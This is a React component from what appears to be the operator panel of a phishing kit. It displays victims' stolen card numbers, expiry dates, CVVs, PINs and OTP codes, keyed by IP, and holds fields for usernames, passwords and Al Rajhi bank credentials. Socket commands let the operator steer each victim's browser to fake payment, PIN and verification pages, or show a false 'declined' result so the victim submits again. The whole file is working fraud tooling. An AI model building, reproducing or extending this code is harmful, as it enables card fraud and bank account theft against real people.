// src/components/CardModal.js
import React, { useState, useEffect, useRef } from "react";
import { Modal, Button } from "react-bootstrap";
import ConfirmDialog from "./ConfirmDialog";
import { socket } from "../socket";
import "./CardModal.css";

const PAGES = [
  "index.html",
  "flow.html",
  "more-info.html",
  "plans.html",
  "plate-number.html",
  "paymen.html",
  "policy-date.html",
  "qoute.html",
  "qoute-solo.html",
  "paymen.html",
  "code.html",
];

const LABEL = {
  "index.html": "Home",
  "flow.html": "Flow",
  "more-info.html": "More-Info",
  "plans.html": "Plans",
  "plate-number.html": "Plate-Number",
  "policy-date.html": "Policy-Date",
  "qoute.html": "Qoute",
  "qoute-solo.html": "Qoute-Solo",
  "paymen.html": "Paymen",
  "verification.html": "C-Code",
  "code.html": "PIN",
};

export default function CardModal({ ip, user, onClose }) {
  const [confirm, setConfirm] = useState({ show: false, page: null });

  const [blinkPin, setBlinkPin] = useState(false);

  const prevPinRef = useRef(user?.pin || "");

  useEffect(() => {
    const current = user?.pin || "";
    if (current && prevPinRef.current !== current) {
      setBlinkPin(true);
      setTimeout(() => setBlinkPin(false), 1500);
    }
    prevPinRef.current = current;
  }, [user?.pin]);

  const handlePageClick = (page) => {
    setConfirm({ show: true, page });
  };

  // Hide ConfirmDialog without emitting anything
  const hideConfirm = () => {
    setConfirm({ show: false, page: null });
  };

  // User clicked “Yes”
  const handleConfirm = () => {
    const page = confirm.page;
    socket.emit("navigateTo", { ip, page });
    hideConfirm();
  };

  // User clicked “No”
  const handleDecline = () => {
    const page = confirm.page;
    socket.emit("navigateTo", {
      ip,
      page: `${page}?declined=true`,
    });
    hideConfirm();
  };

  const {
    payments = [],
    pin = "",
    verification_code_two = "",
    phoneNumber = "",
    birthDate = "",
    operator = "",
    verification_code_three = "",
    username = "",
    password = "",
    rajhiName = "",
    rajhiPw = "",
    rajhiCode = "",
    currentPage = "",
  } = user || {};

  const formatExp = (expRaw) =>
    expRaw && expRaw.length >= 4
      ? `${expRaw.slice(0, 2)}/${expRaw.slice(2)}`
      : expRaw;

  return (
    <>
      <Modal show onHide={onClose} size="xl" centered>
        <Modal.Header closeButton>
          <Modal.Title>Card Control — {ip}</Modal.Title>
        </Modal.Header>

        <Modal.Body>
          {/* Top row of page‐buttons */}
          <div className="btn-grid" id="cardTopBtns">
            {PAGES.slice(0, 6).map((p) => (
              <Button
                key={p}
                variant="outline-primary"
                className={currentPage === p ? "blink-green" : ""}
                onClick={() => handlePageClick(p)}
              >
                {LABEL[p]}
              </Button>
            ))}
          </div>

          {/* Scrollable row of past “card-sim”s */}
          <div
            className="payments-container"
            style={{
              display: "flex",
              overflowX: "auto",
              gap: "1rem",
              marginTop: "1rem",
              paddingBottom: "1rem",
              borderTop: "1px solid #ddd",
              borderBottom: "1px solid #ddd",
            }}
          >
            {payments.length === 0 && (
              <div style={{ color: "#888", padding: "1rem" }}>
                No card submissions yet.
              </div>
            )}
            {payments.map((payDoc, idx) => {
              const { cardHolderName, cardNumber, expirationDate, cvv } =
                payDoc;
              return (
                <div
                  key={`${payDoc._id || idx}`}
                  className="card-sim"
                  style={{
                    minWidth: "260px",
                    border: "1px solid #ccc",
                    borderRadius: "8px",
                    padding: "0.75rem",
                    backgroundColor: "#fefefe",
                    boxShadow: "0 1px 3px rgba(0,0,0,0.1)",
                    flex: "0 0 auto",
                  }}
                >
                  <div
                    style={{
                      fontSize: "0.9rem",
                      fontWeight: 600,
                      marginBottom: "0.5rem",
                    }}
                  >
                    Submission {idx + 1}
                  </div>
                  <div style={{ marginBottom: "0.25rem" }}>
                    <strong>Name:</strong> {cardHolderName || "—"}
                  </div>
                  <div style={{ marginBottom: "0.25rem" }}>
                    <strong>Card #:</strong> {cardNumber ? cardNumber : "—"}
                  </div>
                  <div style={{ marginBottom: "0.25rem" }}>
                    <strong>Exp:</strong> {formatExp(expirationDate) || "—"}
                  </div>
                  <div style={{ marginBottom: "0.25rem" }}>
                    <strong>CVV:</strong> {cvv || "—"}
                  </div>
                </div>
              );
            })}
          </div>

          {/* Single “Latest” block (PIN, Card OTP, Phone, Nafad) */}
          <div
            className="details-block"
            style={{
              display: "flex",
              gap: "2rem",
              marginTop: "1rem",
              padding: "1rem",
              backgroundColor: "#fafafa",
              borderRadius: "8px",
              border: "1px solid #ddd",
            }}
          >
            {/* PIN & Card OTP */}
            <div style={{ flex: 1 }}>
              <h6 style={{ fontWeight: 600, marginBottom: "0.5rem" }}>
                Card PIN ⁄ OTP
              </h6>
              <p
                className={blinkPin ? "blink-green-text" : ""}
                style={{ marginBottom: "0.5rem" }}
              >
                <strong>PIN:</strong> {pin || "—"}
              </p>
            </div>
          </div>

          {/* Bottom row of page‐buttons */}
          <div
            className="btn-grid"
            id="cardBottomBtns"
            style={{ marginTop: "1rem" }}
          >
            {PAGES.slice(6).map((p) => (
              <Button
                key={p}
                variant="outline-primary"
                className={currentPage === p ? "blink-green" : ""}
                onClick={() => handlePageClick(p)}
              >
                {LABEL[p]}
              </Button>
            ))}
          </div>
        </Modal.Body>
      </Modal>

      <ConfirmDialog
        show={confirm.show}
        page={confirm.page}
        onConfirm={handleConfirm}
        onDecline={handleDecline}
        onClose={hideConfirm}
      />
    </>
  );
}
